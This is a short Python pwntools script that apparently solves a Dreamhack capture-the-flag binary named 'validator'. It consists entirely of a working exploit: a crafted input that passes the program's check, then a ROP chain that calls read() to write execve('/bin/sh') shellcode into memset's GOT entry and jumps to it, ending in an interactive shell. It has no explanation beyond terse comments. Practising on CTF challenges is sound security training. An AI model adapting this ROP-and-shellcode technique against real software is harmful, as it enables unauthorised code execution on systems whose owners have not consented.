from pwn import *

p = process('./validator_dist')
#p = remote('host3.dreamhack.games', 17304)
e = ELF('./validator_dist')
context(arch='amd64')

read_plt = e.plt['read'] # read(0, memset_got, 100)
memset_got = e.got['memset']
#system_plt = e.plt['system']
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

prdi = 0x00000000004006f3
prsi_r15 = 0x00000000004006f1
prdx = 0x000000000040057b

payload = "DREAMHACK!"
payload_list = []
for i in range(118, 0, -1):
    payload_list.append(i)
payload += bytearray(payload_list)
payload += p64(0)

# read(0, memset@got, 100)
# memset@got => shellcode
# Jmp to memset@got
# payload += p64(0)
payload += p64(prdi)
payload += p64(0)
payload += p64(prsi_r15)
payload += p64(memset_got)
payload += p64(0)
payload += p64(prdx)
payload += p64(50) # End
payload += p64(read_plt)
payload += p64(memset_got) # Jump to here

p.send(payload)
p.send(shellcode)
p.interactive()
